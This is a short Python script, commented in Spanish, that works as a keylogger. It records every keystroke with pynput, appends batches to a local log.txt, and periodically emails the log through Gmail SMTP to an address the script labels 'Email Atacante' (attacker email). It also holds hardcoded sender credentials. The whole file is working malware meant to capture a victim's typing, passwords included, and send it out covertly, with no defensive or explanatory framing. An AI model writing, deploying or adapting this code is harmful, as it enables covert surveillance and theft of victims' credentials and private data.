from pynput import keyboard as kb
import time, os
# Variables
recoleccion = []
global registros
registros = 0
global dest_email
dest_email = input("Email Atacante")


def send_logs(filename,date_log):
	with open(filename, "r") as log_file:
		logs = log_file.read()
		create_email('sendregistros@gmail.com','enviadorderegistros123',dest_email,'Logs : '+str(date_log),logs)
	log_file.close()


def create_email(user, pwd, recep, subj, body):
	import smtplib
	mailUser=user
	mailPass=pwd
	From=user
	To=recep
	Subject=subj
	Txt=body

	email="""\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)

	try:
		server=smtplib.SMTP("smtp.gmail.com",587)
		server.ehlo()
		server.starttls()
		server.login(mailUser,mailPass)
		server.sendmail(From, To, email)
		server.close()
		print("[+] Registros enviados con exito")
	except:
		print("[-] Error al enviar correo...")

def charge_log(log,logs):
	date_log = str(time.strftime("%d/%m/%y"))+" - "+str(time.strftime("%H:%M:%S"))
	nombre_archivo = "log.txt"
	with open(nombre_archivo, "a") as archivo:
		archivo.write(date_log+"\n")
		archivo.write(str(log)+"\n\n")
	archivo.close()
	global registros
	registros = logs+1
	if registros >= 10:
		send_logs(nombre_archivo,date_log)
		registros = 0

def pulsa(tecla):
	if len(recoleccion) >= 1000:
		charge_log(recoleccion,registros)
		recoleccion.clear()
	else:
		recoleccion.append(tecla)
		print(recoleccion)
			
with kb.Listener(pulsa) as escuchador:
	escuchador.join()
